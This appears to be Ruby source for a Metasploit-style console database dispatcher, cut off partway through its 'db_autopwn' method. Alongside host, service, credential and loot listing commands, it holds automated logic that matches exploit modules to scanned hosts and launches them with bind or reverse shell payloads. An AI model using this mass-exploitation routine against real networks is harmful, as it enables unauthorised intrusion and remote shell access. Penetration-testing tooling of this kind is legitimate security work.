
require 'rexml/document'
require 'rex/parser/nmap_xml'
require 'msf/core/db_export'

module Msf
module Ui
module Console
module CommandDispatcher
class Db

		require 'tempfile'

		include Msf::Ui::Console::CommandDispatcher

		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
		PWN_SLNT = 2**5
		PWN_VERB = 2**6

		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			base = {
				"db_driver"     => "Specify a database driver",
				"db_connect"    => "Connect to an existing database",
				"db_disconnect" => "Disconnect from the current database instance",
				"db_status"     => "Show the current database status",
			}

			more = {
				"workspace"     => "Switch between database workspaces",
				"hosts"         => "List all hosts in the database",
				"services"      => "List all services in the database",
				"vulns"         => "List all vulnerabilities in the database",
				"notes"         => "List all notes in the database",
				"loot"          => "List all loot in the database",
				"creds"         => "List all credentials in the database",
				"db_autopwn"    => "Automatically exploit everything",
				"db_import"     => "Import a scan result file (filetype will be auto-detected)",
				"db_export"     => "Export a file containing the contents of the database",
				"db_nmap"       => "Executes nmap and records the output automatically",
			}

			# Always include commands that only make sense when connected.
			# This avoids the problem of them disappearing unexpectedly if the
			# database dies or times out.  See #1923
			base.merge(more)
		end

		#
		# Returns true if the db is connected, prints an error and returns
		# false if not.
		#
		# All commands that require an active database should call this before
		# doing anything.
		#
		def active?
			if not framework.db.active
				print_error("Database not connected")
				return false
			end
			true
		end

		def cmd_workspace_help
			print_line "Usage:"
			print_line "    workspace                  List workspaces"
			print_line "    workspace [name]           Switch workspace"
			print_line "    workspace -a [name] ...    Add workspace(s)"
			print_line "    workspace -d [name] ...    Delete workspace(s)"
			print_line "    workspace -h               Show this help information"
			print_line
		end

		def cmd_workspace(*args)
			return unless active?
			while (arg = args.shift)
				case arg
				when '-h','--help'
					cmd_workspace_help
					return
				when '-a','--add'
					adding = true
				when '-d','--del'
					deleting = true
				else
					names ||= []
					names << arg
				end
			end

			if adding and names
				# Add workspaces
				workspace = nil
				names.each do |name|
					workspace = framework.db.add_workspace(name)
					print_status("Added workspace: #{workspace.name}")
				end
				framework.db.workspace = workspace
			elsif deleting and names
				# Delete workspaces
				names.each do |name|
					workspace = framework.db.find_workspace(name)
					if workspace.nil?
						print_error("Workspace not found: #{name}")
					elsif workspace.default?
						workspace.destroy
						workspace = framework.db.add_workspace(name)
						print_status("Deleted and recreated the default workspace")
					else
						# switch to the default workspace if we're about to delete the current one
						framework.db.workspace = framework.db.default_workspace if framework.db.workspace.name == workspace.name
						# now destroy the named workspace
						workspace.destroy
						print_status("Deleted workspace: #{name}")
					end
				end
			elsif names
				name = names.last
				# Switch workspace
				workspace = framework.db.find_workspace(name)
				if workspace
					framework.db.workspace = workspace
					print_status("Workspace: #{workspace.name}")
				else
					print_error("Workspace not found: #{name}")
					return
				end
			else
				# List workspaces
				framework.db.workspaces.each do |s|
					pad = (s.name == framework.db.workspace.name) ? "* " : "  "
					print_line(pad + s.name)
				end
			end
		end

		def cmd_workspace_tabs(str, words)
			return [] unless active?
			framework.db.workspaces.map { |s| s.name } if (words & ['-a','--add']).empty?
		end

		def cmd_hosts_help
			# This command does some lookups for the list of appropriate column
			# names, so instead of putting all the usage stuff here like other
			# help methods, just use it's "-h" so we don't have to recreating
			# that list
			cmd_hosts("-h")
		end

		def cmd_hosts(*args)
			return unless active?
			onlyup = false
			host_search = nil
			set_rhosts = false
			mode = :search
			delete_count = 0

			host_ranges = []

			output = nil
			default_columns = ::Msf::DBManager::Host.column_names.sort
			virtual_columns = [ 'svcs', 'vulns', 'workspace' ]

			col_search = [ 'address', 'mac', 'name', 'os_name', 'os_flavor', 'os_sp', 'purpose', 'info', 'comments' ]

			default_columns.delete_if {|v| (v[-2,2] == "id")}
			while (arg = args.shift)
				case arg
				when '-a','--add'
					mode = :add
				when '-d','--delete'
					mode = :delete
				when '-c'
					list = args.shift
					if(!list)
						print_error("Invalid column list")
						return
					end
					col_search = list.strip().split(",")
					col_search.each { |c|
						if not default_columns.include?(c) and not virtual_columns.include?(c)
							all_columns = default_columns + virtual_columns
							print_error("Invalid column list. Possible values are (#{all_columns.join("|")})")
							return
						end
					}
				when '-u','--up'
					onlyup = true
				when '-o'
					output = args.shift
				when '-R','--rhosts'
					set_rhosts = true
					rhosts = []

				when '-h','--help'
					print_line "Usage: hosts [ options ] [addr1 addr2 ...]"
					print_line
					print_line "OPTIONS:"
					print_line "  -a,--add          Add the hosts instead of searching"
					print_line "  -d,--delete       Delete the hosts instead of searching"
					print_line "  -c <col1,col2>    Only show the given columns (see list below)"
					print_line "  -h,--help         Show this help information"
					print_line "  -u,--up           Only show hosts which are up"
					print_line "  -o <file>         Send output to a file in csv format"
					print_line "  -R,--rhosts       Set RHOSTS from the results of the search"
					print_line
					print_line "Available columns: #{default_columns.join(", ")}"
					print_line
					return
				else
					# Anything that wasn't an option is a host to search for
					unless (arg_host_range(arg, host_ranges))
						return
					end
				end
			end

			if col_search
				col_names = col_search
			else
				col_names = default_columns + virtual_columns
			end

			if mode == :add
				host_ranges.each do |range|
					range.each do |address|
						host = framework.db.find_or_create_host(:host => address)
						print_status("Time: #{host.created_at} Host: host=#{host.address}")
						if set_rhosts
							# only unique addresses
							rhosts << host.address unless rhosts.include?(host.address)
						end
					end
				end
				return
			end

			# If we got here, we're searching.  Delete implies search

			tbl = Rex::Ui::Text::Table.new(
				{
					'Header'  => "Hosts",
					'Columns' => col_names,
				})

			# Sentinal value meaning all
			host_ranges.push(nil) if host_ranges.empty?

			each_host_range_chunk(host_ranges) do |host_search|
				framework.db.hosts(framework.db.workspace, onlyup, host_search).each do |host|
					columns = col_names.map do |n|
						# Deal with the special cases
						if virtual_columns.include?(n)
							case n
							when "svcs";      host.services.length
							when "vulns";     host.vulns.length
							when "workspace"; host.workspace.name
							end
						# Otherwise, it's just an attribute
						else
							host.attributes[n] || ""
						end
					end

					tbl << columns
					if set_rhosts
						# only unique addresses
						rhosts << host.address unless rhosts.include?(host.address)
					end
					if mode == :delete
						host.destroy
						delete_count += 1
					end
				end
			end

			if output
				print_status("Wrote hosts to #{output}")
				::File.open(output, "wb") { |ofd|
					ofd.write(tbl.to_csv)
				}
			else
				print_line
				print_line tbl.to_s
			end

			# Finally, handle the case where the user wants the resulting list
			# of hosts to go into RHOSTS.
			set_rhosts_from_addrs(rhosts) if set_rhosts
			print_status("Deleted #{delete_count} hosts") if delete_count > 0
		end

		def cmd_services_help
			# Like cmd_hosts, use "-h" instead of recreating the column list
			# here
			cmd_services("-h")
		end

		def cmd_services(*args)
			return unless active?
			mode = :search
			onlyup = false
			output_file = nil
			set_rhosts = nil
			col_search = ['port', 'proto', 'name', 'state', 'info']
			default_columns = ::Msf::DBManager::Service.column_names.sort
			default_columns.delete_if {|v| (v[-2,2] == "id")}

			host_ranges = []
			port_ranges = []
			delete_count = 0

			# option parsing
			while (arg = args.shift)
				case arg
				when '-a','--add'
					mode = :add
				when '-d','--delete'
					mode = :delete
				when '-u','--up'
					onlyup = true
				when '-c'
					list = args.shift
					if(!list)
						print_error("Invalid column list")
						return
					end
					col_search = list.strip().split(",")
					col_search.each { |c|
						if not default_columns.include? c
							print_error("Invalid column list. Possible values are (#{default_columns.join("|")})")
							return
						end
					}
				when '-p'
					unless (arg_port_range(args.shift, port_ranges, true))
						return
					end
				when '-r'
					proto = args.shift
					if (!proto)
						print_status("Invalid protocol")
						return
					end
					proto = proto.strip
				when '-s'
					namelist = args.shift
					if (!namelist)
						print_error("Invalid name list")
						return
					end
					names = namelist.strip().split(",")
				when '-o'
					output_file = args.shift
					if (!output_file)
						print_error("Invalid output filename")
						return
					end
					output_file = File.expand_path(output_file)
				when '-R','--rhosts'
					set_rhosts = true
					rhosts = []

				when '-h','--help'
					print_line
					print_line "Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-n <name1,name2>] [-o <filename>] [addr1 addr2 ...]"
					print_line
					print_line "  -a,--add          Add the services instead of searching"
					print_line "  -d,--delete       Delete the services instead of searching"
					print_line "  -c <col1,col2>    Only show the given columns"
					print_line "  -h,--help         Show this help information"
					print_line "  -s <name1,name2>  Search for a list of service names"
					print_line "  -p <port1,port2>  Search for a list of ports"
					print_line "  -r <protocol>     Only show [tcp|udp] services"
					print_line "  -u,--up           Only show services which are up"
					print_line "  -o <file>         Send output to a file in csv format"
					print_line "  -R,--rhosts       Set RHOSTS from the results of the search"
					print_line
					print_line "Available columns: #{default_columns.join(", ")}"
					print_line
					return
				else
					# Anything that wasn't an option is a host to search for
					unless (arg_host_range(arg, host_ranges))
						return
					end
				end
			end

			ports = port_ranges.flatten.uniq

			if mode == :add
				# Can only deal with one port and one service name at a time
				# right now.  Them's the breaks.
				if ports.length != 1
					print_error("Exactly one port required")
					return
				end
				host_ranges.each do |range|
					range.each do |addr|
						host = framework.db.find_or_create_host(:host => addr)
						next if not host
						info = {
							:host => host,
							:port => ports.first.to_i
						}
						info[:proto] = proto.downcase if proto
						info[:name]  = names.first.downcase if names and names.first

						svc = framework.db.find_or_create_service(info)
						print_status("Time: #{svc.created_at} Service: host=#{svc.host.address} port=#{svc.port} proto=#{svc.proto} name=#{svc.name}")
					end
				end
				return
			end

			# If we got here, we're searching.  Delete implies search

			col_names = default_columns
			if col_search
				col_names = col_search
			end
			tbl = Rex::Ui::Text::Table.new({
					'Header'  => "Services",
					'Columns' => ['host'] + col_names,
				})

			# Sentinal value meaning all
			host_ranges.push(nil) if host_ranges.empty?
			ports = nil if ports.empty?

			each_host_range_chunk(host_ranges) do |host_search|
				framework.db.services(framework.db.workspace, onlyup, proto, host_search, ports, names).each do |service|

					host = service.host
					columns = [host.address] + col_names.map { |n| service[n].to_s || "" }
					tbl << columns
					if set_rhosts
						# only unique addresses
						rhosts << host.address unless rhosts.include?(host.address)
					end
					if (mode == :delete)
						service.destroy
						delete_count += 1
					end
				end
			end

			print_line
			if (output_file == nil)
				print_line tbl.to_s
			else
				# create the output file
				File.open(output_file, "wb") { |f| f.write(tbl.to_csv) }
				print_status("Wrote services to #{output_file}")
			end

			# Finally, handle the case where the user wants the resulting list
			# of hosts to go into RHOSTS.
			set_rhosts_from_addrs(rhosts) if set_rhosts
			print_status("Deleted #{delete_count} services") if delete_count > 0

		end


		def cmd_vulns_help
			print_line "Print all vulnerabilities in the database"
			print_line
			print_line "Usage: vulns [addr range]"
			print_line
			#print_line "  -a,--add              Add creds to the given addresses instead of listing"
			#print_line "  -d,--delete           Delete the creds instead of searching"
			print_line "  -h,--help             Show this help information"
			print_line "  -p,--port <portspec>  List vulns matching this port spec"
			print_line "  -s <svc names>        List vulns matching these service names"
			print_line
			print_line "Examples:"
			print_line "  vulns -p 1-65536          # only vulns with associated services"
			print_line "  vulns -p 1-65536 -s http  # identified as http on any port"
			print_line
		end


		def cmd_vulns(*args)
			return unless active?

			host_ranges = []
			port_ranges = []
			svcs        = []

			# Short-circuit help
			if args.delete "-h"
				cmd_vulns_help
				return
			end

			mode = :search
			while (arg = args.shift)
				case arg
				#when "-a","--add"
				#	mode = :add
				#when "-d"
				#	mode = :delete
				when "-h"
					cmd_creds_help
					return
				when "-p","--port"
					unless (arg_port_range(args.shift, port_ranges, true))
						return
					end
				when "-s","--service"
					service = args.shift
					if (!service)
						print_error("Argument required for -s")
						return
					end
					svcs = service.split(/[\s]*,[\s]*/)
				else
					# Anything that wasn't an option is a host to search for
					unless (arg_host_range(arg, host_ranges))
						return
					end
				end
			end

			# normalize
			host_ranges.push(nil) if host_ranges.empty?
			ports = port_ranges.flatten.uniq
			svcs.flatten!

			each_host_range_chunk(host_ranges) do |host_search|
				framework.db.hosts(framework.db.workspace, false, host_search).each do |host|
					host.vulns.each do |vuln|
						reflist = vuln.refs.map { |r| r.name }
						if(vuln.service)
							# Skip this one if the user specified a port and it
							# doesn't match.
							next unless ports.empty? or ports.include? vuln.service.port
							# Same for service names
							next unless svcs.empty? or svcs.include?(vuln.service.name)
							print_status("Time: #{vuln.created_at} Vuln: host=#{host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}")
						else
							# This vuln has no service, so it can't match
							next unless ports.empty? and svcs.empty?
							print_status("Time: #{vuln.created_at} Vuln: host=#{host.address} name=#{vuln.name} refs=#{reflist.join(',')}")
						end
					end
				end
			end
		end


		def cmd_creds_help
			print_line "Usage: creds [addr range]"
			print_line "Usage: creds -a <addr range> -p <port> -t <type> -u <user> -P <pass>"
			print_line
			print_line "  -a,--add              Add creds to the given addresses instead of listing"
			print_line "  -d,--delete           Delete the creds instead of searching"
			print_line "  -h,--help             Show this help information"
			print_line "  -p,--port <portspec>  List creds matching this port spec"
			print_line "  -s <svc names>        List creds matching these service names"
			print_line "  -t,--type <type>      Add a cred of this type (only with -a). Default: password"
			print_line "  -u,--user      Add a cred for this user (only with -a). Default: blank"
			print_line "  -P,--password  Add a cred with this password (only with -a). Default: blank"
			print_line
			print_line "Examples:"
			print_line "  creds               # Default, returns all active credentials"
			print_line "  creds all           # Returns all credentials active or not"
			print_line "  creds 1.2.3.4/24    # nmap host specification"
			print_line "  creds -p 22-25,445  # nmap port specification"
			print_line "  creds 10.1.*.* -s ssh,smb all"
			print_line
		end

		#
		# Can return return active or all, on a certain host or range, on a
		# certain port or range, and/or on a service name.
		#
		def cmd_creds(*args)
			return unless active?

			search_param = nil
			inactive_ok = false
			type = "password"

			host_ranges = []
			port_ranges = []
			svcs        = []

			# Short-circuit help
			if args.delete "-h"
				cmd_creds_help
				return
			end

			mode = :search
			while (arg = args.shift)
				case arg
				when "-a","--add"
					mode = :add
				when "-d"
					mode = :delete
				when "-h"
					cmd_creds_help
					return
				when "-p","--port"
					unless (arg_port_range(args.shift, port_ranges, true))
						return
					end
				when "-t","--type"
					ptype = args.shift
					if (!ptype)
						print_error("Argument required for -t")
						return
					end
				when "-s","--service"
					service = args.shift
					if (!service)
						print_error("Argument required for -s")
						return
					end
					svcs = service.split(/[\s]*,[\s]*/)
				when "-P","--password"
					pass = args.shift
					if (!pass)
						print_error("Argument required for -P")
						return
					end
				when "-u","--user"
					user = args.shift
					if (!user)
						print_error("Argument required for -u")
						return
					end
				when "all"
					# The user wants inactive passwords, too
					inactive_ok = true
				else
					# Anything that wasn't an option is a host to search for
					unless (arg_host_range(arg, host_ranges))
						return
					end
				end
			end

			if mode == :add
				if port_ranges.length != 1 or port_ranges.first.length != 1
					print_error("Exactly one port required")
					return
				end
				port = port_ranges.first.first
				host_ranges.each do |range|
					range.each do |host|
						cred = framework.db.find_or_create_cred(
							:host => host,
							:port => port,
							:user => (user == "NULL" ? nil : user),
							:pass => (pass == "NULL" ? nil : pass),
							:ptype => ptype,
							:sname => service,
							:active => true
						)
						print_status("Time: #{cred.updated_at} Credential: host=#{cred.service.host.address} port=#{cred.service.port} proto=#{cred.service.proto} sname=#{cred.service.name} type=#{cred.ptype} user=#{cred.user} pass=#{cred.pass} active=#{cred.active}")
					end
				end
				return
			end

			# If we get here, we're searching.  Delete implies search

			# normalize
			ports = port_ranges.flatten.uniq
			svcs.flatten!

			tbl = Rex::Ui::Text::Table.new({
					'Header'  => "Credentials",
					'Columns' => [ 'host', 'port', 'user', 'pass', 'type', 'active?' ],
				})

			creds_returned = 0
			# Now do the actual search
			framework.db.each_cred(framework.db.workspace) do |cred|
				# skip if it's inactive and user didn't ask for all
				next unless (cred.active or inactive_ok)

				# Also skip if the user is searching for something and this
				# one doesn't match
				includes = false
				host_ranges.map do |rw|
					includes = rw.include? cred.service.host.address
					break if includes
				end
				next unless host_ranges.empty? or includes

				# Same for ports
				next unless ports.empty? or ports.include? cred.service.port

				# Same for service names
				next unless svcs.empty? or svcs.include?(cred.service.name)

				row = [
						cred.service.host.address, cred.service.port,
						cred.user, cred.pass, cred.ptype,
						(cred.active ? "true" : "false")
					]
				tbl << row
				if mode == :delete
					cred.destroy
				end
				creds_returned += 1
			end
			print_line
			print_line tbl.to_s
			print_status "Found #{creds_returned} credential#{creds_returned == 1 ? "" : "s"}."
		end

		def cmd_notes_help
			print_line "Usage: notes [-h] [-t <type1,type2>] [-n <data string>] [-a] [addr range]"
			print_line
			print_line "  -a,--add          Add a note to the list of addresses, instead of listing"
			print_line "  -d,--delete       Delete the hosts instead of searching"
			print_line "  -n,--note <data>  Set the data for a new note (only with -a)"
			print_line "  -t <type1,type2>  Search for a list of types"
			print_line "  -h,--help         Show this help information"
			print_line "  -R,--rhosts       Set RHOSTS from the results of the search"
			print_line
			print_line "Examples:"
			print_line "  notes --add -t apps -n 'winzip' 10.1.1.34 10.1.20.41"
			print_line "  notes -t smb.fingerprint 10.1.1.34 10.1.20.41"
			print_line
		end

		def cmd_notes(*args)
			return unless active?
			mode = :search
			data = nil
			types = nil
			set_rhosts = false

			host_ranges = []

			while (arg = args.shift)
				case arg
				when '-a','--add'
					mode = :add
				when '-d','--delete'
					mode = :delete
				when '-n','--note'
					data = args.shift
					if(!data)
						print_error("Can't make a note with no data")
						return
					end
				when '-t'
					typelist = args.shift
					if(!typelist)
						print_error("Invalid type list")
						return
					end
					types = typelist.strip().split(",")
				when '-R','--rhosts'
					set_rhosts = true
					rhosts = []
				when '-h','--help'
					cmd_notes_help
					return
				else
					# Anything that wasn't an option is a host to search for
					unless (arg_host_range(arg, host_ranges))
						return
					end
				end

			end

			if mode == :add
				if types.nil? or types.size != 1
					print_error("Exactly one note type is required")
					return
				end
				type = types.first
				host_ranges.each { |range|
					range.each { |addr|
						host = framework.db.find_or_create_host(:host => addr)
						break if not host
						note = framework.db.find_or_create_note(:host => host, :type => type, :data => data)
						break if not note
						print_status("Time: #{note.created_at} Note: host=#{host.address} type=#{note.ntype} data=#{note.data}")
					}
				}
				return
			end

			host_ranges.push(nil) if host_ranges.empty?

			delete_count = 0
			each_host_range_chunk(host_ranges) do |host_search|
				framework.db.hosts(framework.db.workspace, false, host_search).each do |host|
				host.notes.each do |note|
					next if(types and types.index(note.ntype).nil?)
					msg = "Time: #{note.created_at} Note:"
					if (note.host)
						host = note.host
						msg << " host=#{note.host.address}"
						if set_rhosts
							# only unique addresses
							rhosts << host.address unless rhosts.include?(host.address)
						end
					end
					if (note.service)
						name = (note.service.name ? note.service.name : "#{note.service.port}/#{note.service.proto}")
						msg << " service=#{name}"
					end
					msg << " type=#{note.ntype} data=#{note.data.inspect}"
					print_status(msg)
					if mode == :delete
						note.destroy
						delete_count += 1
					end
				end
				end
			end

			# Finally, handle the case where the user wants the resulting list
			# of hosts to go into RHOSTS.
			set_rhosts_from_addrs(rhosts) if set_rhosts

			print_status("Deleted #{delete_count} note#{delete_count == 1 ? "" : "s"}") if delete_count > 0
		end

		def cmd_loot_help
			print_line "Usage: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]"
			print_line
			print_line "  -t <type1,type2>  Search for a list of types"
			print_line "  -h,--help         Show this help information"
			print_line
		end

		def cmd_loot(*args)
			return unless active?
			mode = :search
			host_ranges = []
			types = nil
			while (arg = args.shift)
				case arg
				when '-d','--delete'
					mode = :delete
				when '-t'
					typelist = args.shift
					if(!typelist)
						print_status("Invalid type list")
						return
					end
					types = typelist.strip().split(",")
				when '-h','--help'
					cmd_loot_help
					return
				else
					# Anything that wasn't an option is a host to search for
					unless (arg_host_range(arg, host_ranges))
						return
					end
				end

			end
			tbl = Rex::Ui::Text::Table.new({
					'Header'  => "Loot",
					'Columns' => [ 'host', 'service', 'type', 'name', 'content', 'info', 'path' ],
				})

			# Sentinal value meaning all
			host_ranges.push(nil) if host_ranges.empty?

			each_host_range_chunk(host_ranges) do |host_search|
				framework.db.hosts(framework.db.workspace, false, host_search).each do |host|
					host.loots.each do |loot|
						next if(types and types.index(loot.ltype).nil?)
						row = []
						row.push( (loot.host ? loot.host.address : "") )
						if (loot.service)
							svc = (loot.service.name ? loot.service.name : "#{loot.service.port}/#{loot.service.proto}")
							row.push svc
						else
							row.push ""
						end
						row.push(loot.ltype)
						row.push(loot.name || "")
						row.push(loot.content_type)
						row.push(loot.info || "")
						row.push(loot.path)

						tbl << row
						if (mode == :delete)
							loot.destroy
						end
					end
				end
			end
			print_line
			print_line tbl.to_s
		end

		#
		# A shotgun approach to network-wide exploitation
		#
		def cmd_db_autopwn(*args)
			return unless active?

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			mjob  = 5
			regx  = nil
			minrank = nil
			maxtime = 120

			port_inc = []
			port_exc = []

			targ_inc = []
			targ_exc = []

			args.push("-h") if args.length == 0

			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING
				when '-q'
					mode |= PWN_SLNT
				when '-v'
					mode |= PWN_VERB
				when '-j'
					mjob = args.shift.to_i
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					tmpopt = OptAddressRange.new('TEMPRANGE', [ true, '' ])
					range = args.shift
					if not tmpopt.valid?(range)
						print_error("Invalid range for -I")
						return
					end
					targ_inc << Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
				when '-X'
					tmpopt = OptAddressRange.new('TEMPRANGE', [ true, '' ])
					range = args.shift
					if not tmpopt.valid?(range)
						print_error("Invalid range for -X")
						return
					end
					targ_exc << Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
				when '-PI'
					port_inc = Rex::Socket.portspec_to_portlist(args.shift)
				when '-PX'
					port_exc = Rex::Socket.portspec_to_portlist(args.shift)
				when '-m'
					regx = args.shift
				when '-R'
					minrank = args.shift
				when '-T'
					maxtime = args.shift.to_f
				when '-h','--help'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h          Display this help text")
					print_line("\t-t          Show all matching exploit modules")
					print_line("\t-x          Select modules based on vulnerability references")
					print_line("\t-p          Select modules based on open ports")
					print_line("\t-e          Launch exploits against all matched targets")
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r          Use a reverse connect shell")
					print_line("\t-b          Use a bind shell on a random port (default)")
					print_line("\t-q          Disable exploit module output")
					print_line("\t-R  [rank]  Only run modules with a minimal rank")
					print_line("\t-I  [range] Only exploit hosts inside this range")
					print_line("\t-X  [range] Always exclude hosts inside this range")
					print_line("\t-PI [range] Only exploit hosts with these ports open")
					print_line("\t-PX [range] Always exclude hosts with these ports open")
					print_line("\t-m  [regex] Only run modules whose name matches the regex")
					print_line("\t-T  [secs]  Maximum runtime for any exploit in seconds")
					print_line("")
					return
				end
			end

			minrank = minrank || framework.datastore['MinimumRank'] || 'manual'
			if ! RankingName.values.include?(minrank)
				print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
				wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
				return
			else
				minrank = RankingName.invert[minrank]
			end

			# Default to quiet mode
			if (mode & PWN_VERB == 0)
				mode |= PWN_SLNT
			end

			matches    = {}
			refmatches = {}

			# Pre-allocate a list of references and ports for all exploits
			mrefs  = {}
			mports = {}
			mservs = {}

			# A list of jobs we spawned and need to wait for
			autopwn_jobs = []

			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|
				mtype[0].each_module do |modname, mod|
					o = mod.new

					if(mode & PWN_XREF != 0)
						o.references.each do |r|
							next if r.ctx_id == 'URL'
							ref = r.ctx_id + "-" + r.ctx_val
							ref.upcase!

							mrefs[ref] ||= {}
							mrefs[ref][o.fullname] = o
						end
					end

					if(mode & PWN_PORT != 0)
						if(o.datastore['RPORT'])
							rport = o.datastore['RPORT']
							mports[rport.to_i] ||= {}
							mports[rport.to_i][o.fullname] = o
						end

						if(o.respond_to?('autofilter_ports'))
							o.autofilter_ports.each do |rport|
								mports[rport.to_i] ||= {}
								mports[rport.to_i][o.fullname] = o
							end
						end

						if(o.respond_to?('autofilter_services'))
							o.autofilter_services.each do |serv|
								mservs[serv] ||= {}
								mservs[serv][o.fullname] = o
							end
						end
					end
				end
			end


			begin

			framework.db.hosts.each do |host|
				xhost = host.address
				next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
				next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

				if(mode & PWN_VERB != 0)
					print_status("Scanning #{xhost} for matching exploit modules...")
				end

				#
				# Match based on vulnerability references
				#
				if (mode & PWN_XREF != 0)

					host.vulns.each do |vuln|

						# Faster to handle these here
						serv = vuln.service
						xport = xprot = nil

						if(serv)
							xport = serv.port
							xprot = serv.proto
						end

						vuln.refs.each do |ref|
							mods = mrefs[ref.name.upcase] || {}
							mods.each_key do |modname|
								mod = mods[modname]
								next if minrank and minrank > mod.rank
								next if (regx and mod.fullname !~ /#{regx}/)

								if(xport)
									next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
									next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								else
									if(mod.datastore['RPORT'])
										next if (port_inc.length > 0 and not port_inc.include?(mod.datastore['RPORT'].to_i))
										next if (port_exc.length > 0 and port_exc.include?(mod.datastore['RPORT'].to_i))
									end
								end

								next if (regx and e.fullname !~ /#{regx}/)

								mod.datastore['RPORT'] = xport if xport
								mod.datastore['RHOST'] = xhost

								filtered = false
								begin
									::Timeout.timeout(2, ::RuntimeError) do
										filtered = true if not mod.autofilter()
									end
								rescue ::Interrupt
									raise $!
								rescue ::Timeout::Error
									filtered = true
								rescue ::Exception
									filtered = true
								end
								next if filtered

								matches[[xport,xprot,xhost,mod.fullname]]=true
								refmatches[[xport,xprot,xhost,mod.fullname]] ||= []
								refmatches[[xport,xprot,xhost,mod.fullname]] << ref.name
							end
						end
					end
				end

				#
				# Match based on open ports
				#
				if (mode & PWN_PORT != 0)
					host.services.each do |serv|
						next if not serv.host
						next if (serv.state != ServiceState::Open)

						xport = serv.port.to_i
						xprot = serv.proto
						xname = serv.name

						next if xport == 0

						next if (port_inc.length > 0 and not port_inc.include?(xport))
						next if (port_exc.length > 0 and port_exc.include?(xport))

						mods = mports[xport.to_i] || {}

						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end

						mods = mservs[xname] || {}
						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end
					end
				end
			end

			rescue ::Exception => e
				print_status("ERROR: #{e.class} #{e} #{e.backtrace}")
				return
			end

			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)")
				print_status("")
				print_status("=" * 80)
				print_status(" " * 28 + "Matching Exploit Modules")
				print_status("=" * 80)

				matches.each_key do |xref|
					mod = nil
					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						tport = xref[0] || mod.datastore['RPORT']
						if(refmatches[xref])
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(", ")})")
						else
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (port match)")
						end
					end

				end
				print_status("=" * 80)
				print_status("")
				print_status("")
			end

			ilog("db_autopwn: Matched #{matches.length} modules")

			idx = 0
			matches.each_key do |xref|

				idx += 1

				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]

						if(xref[0])
							mod.datastore['RPORT'] = xref[0].to_s
						end

						if (code == :bind)
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							end
						end

						if (code == :conn)
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s

							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end

							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							end
						end


						if(framework.jobs.keys.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(framework.jobs.keys.length >= mjob)
								::IO.select(nil, nil, nil, 0.25)
							end
						end

						print_status("(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")

						autopwn_jobs << framework.threads.spawn("AutoPwnJob#{xref[3]}", false, mod) do |xmod|
							begin
							stime = Time.now.to_f
							::Timeout.timeout(maxtime) do
